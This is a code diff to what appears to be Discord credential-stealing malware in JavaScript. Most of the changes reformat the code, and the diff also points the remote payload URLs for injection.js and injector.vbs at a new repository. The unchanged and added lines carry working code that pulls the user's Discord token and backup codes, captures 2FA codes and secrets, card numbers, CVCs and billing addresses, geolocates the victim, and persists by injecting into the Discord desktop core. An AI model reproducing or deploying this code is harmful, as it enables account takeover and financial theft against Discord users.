@@ -38,19 +38,23 @@ const CONFIG = {
  auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
  auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
  auto_email_update: '%AUTO_EMAIL_UPDATE%',
- injection_url: 'https://raw.githubusercontent.com/r4lrgx/discord-injection-public/main/injection.js',
- injector_url: 'https://raw.githubusercontent.com/r4lrgx/vbs-injector/main/injector.vbs',
+ injection_url: 'https://raw.githubusercontent.com/wishware/discord-injection-public/main/injection.js',
+ injector_url: 'https://raw.githubusercontent.com/wishware/discord-vbs-injector/main/injector.vbs',
  get: {
-  token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
+  token: () =>
+   execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
   logout: () =>
    execScript(
-    `function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`,
+    `function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`
    ),
   backup_codes: () =>
    execScript(
-    `const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`,
+    `const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`
    ),
-  clear_local_storage: () => execScript(`const iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.contentWindow.localStorage.clear();document.body.removeChild(iframe);setTimeout(() => {window.location.reload();}, 3000);`),
+  clear_local_storage: () =>
+   execScript(
+    `const iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.contentWindow.localStorage.clear();document.body.removeChild(iframe);setTimeout(() => {window.location.reload();}, 3000);`
+   ),
  },
  auth_filters: {
   urls: [
@@ -282,7 +286,7 @@ const notify = async (ctx, token, user) => {
   { name: '\u200b', value: '\u200b', inline: false },
   { name: 'Badges', value: badges, inline: true },
   { name: 'Billing', value: billing, inline: true },
-  { name: 'Path', value: `\`${__dirname.trim().replace(/\\/g, '/')}\``, inline: false },
+  { name: 'Path', value: `\`${__dirname.trim().replace(/\\/g, '/')}\``, inline: false }
  );
 
  if (friends) {
@@ -334,7 +338,7 @@ const notify = async (ctx, token, user) => {
    {
     'Content-Type': 'application/json',
    },
-   JSON.stringify(ctx),
+   JSON.stringify(ctx)
   );
  } catch (error) {
   return null;
@@ -376,8 +380,8 @@ const editSettingUser = async token => {
       emoji_id: null,
       emoji_name: null,
      },
-    }),
-   ),
+    })
+   )
   );
 
   return response;
@@ -474,7 +478,7 @@ class GetDataUser {
    const response = parseJSON(
     await request('GET', 'http://ip-api.com/json', {
      'Content-Type': 'application/json',
-    }),
+    })
    );
    return response;
   } catch (error) {
@@ -488,7 +492,7 @@ class GetDataUser {
    (result, badge) =>
     // prettier
     CONFIG.badges.hasOwnProperty(badge) && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value ? `${result}${CONFIG.badges[badge].emoji} ` : result,
-   '',
+   ''
   ) || '❓';
 
  RareBadges = flags =>
@@ -496,8 +500,10 @@ class GetDataUser {
    // prettier
    (result, badge) =>
     // prettier
-    CONFIG.badges.hasOwnProperty(badge) && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value && CONFIG.badges[badge].rare ? `${result}${CONFIG.badges[badge].emoji} ` : result,
-   '',
+    CONFIG.badges.hasOwnProperty(badge) && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value && CONFIG.badges[badge].rare
+     ? `${result}${CONFIG.badges[badge].emoji} `
+     : result,
+   ''
   ) || '';
 
  Billing = async token => {
@@ -569,7 +575,7 @@ class GetDataUser {
      await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
       'Content-Type': 'application/json',
       Authorization: token,
-     }),
+     })
     );
 
     const invites = response;
@@ -580,7 +586,7 @@ class GetDataUser {
     const name = `**${guild.name}** - (${guild.id})`;
 
     return `${emoji} | ${name} - ${members} - ${invite}\n`;
-   }),
+   })
   );
 
   const hQGuildsPlain = hQGuilds.join('');
@@ -729,7 +735,10 @@ const Cruise = async (type, response, request, email, password, token, action) =
    };
 
    if (request?.code !== undefined && request?.secret !== undefined) {
-    content.embeds[0].fields.push({ name: 'Used 2FA code', value: `\`${request.code}\``, inline: true }, { name: 'Authentication secret', value: `\`${request.secret}\``, inline: true });
+    content.embeds[0].fields.push(
+     { name: 'Used 2FA code', value: `\`${request.code}\``, inline: true },
+     { name: 'Authentication secret', value: `\`${request.secret}\``, inline: true }
+    );
    }
 
    notify(content, token, user);
@@ -748,7 +757,13 @@ const Cruise = async (type, response, request, email, password, token, action) =
        { name: 'CVC', value: `\`${request.item['card[cvc]']}\``, inline: true },
        { name: 'Expiration', value: `\`${request.item['card[exp_month]']}/${request.item['card[exp_year]']}\``, inline: true },
       ],
-      fields: [{ name: 'Address', value: `\`\`\`\nLine 1: ${request['line_1']}\nLine 2: ${request['line_2']}\nCity: ${request['city']}\nState: ${request['state']}\nPostal Code: ${request['postal_code']}\nCountry: ${request['country']}\n\`\`\``, inline: false }],
+      fields: [
+       {
+        name: 'Address',
+        value: `\`\`\`\nLine 1: ${request['line_1']}\nLine 2: ${request['line_2']}\nCity: ${request['city']}\nState: ${request['state']}\nPostal Code: ${request['postal_code']}\nCountry: ${request['country']}\n\`\`\``,
+        inline: false,
+       },
+      ],
      },
     ],
    };
@@ -931,7 +946,7 @@ const startup = async () => {
   'modules',
   fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)),
   'discord_desktop_core',
-  'index.js',
+  'index.js'
  );
  const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
 
@@ -1028,7 +1043,7 @@ const translateEmailUpdate = async (token, locale) => {
    await request('GET', `https://translate.w1sh.xyz/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
     'Content-Type': 'application/json',
     Authorization: token,
-   }),
+   })
   );
 
   if (!response.success) {
@@ -1158,7 +1173,7 @@ const isLogged = async () => {
      JSON.stringify({
       provider: null,
       voip_provider: null,
-     }),
+     })
     );
 
     return false;
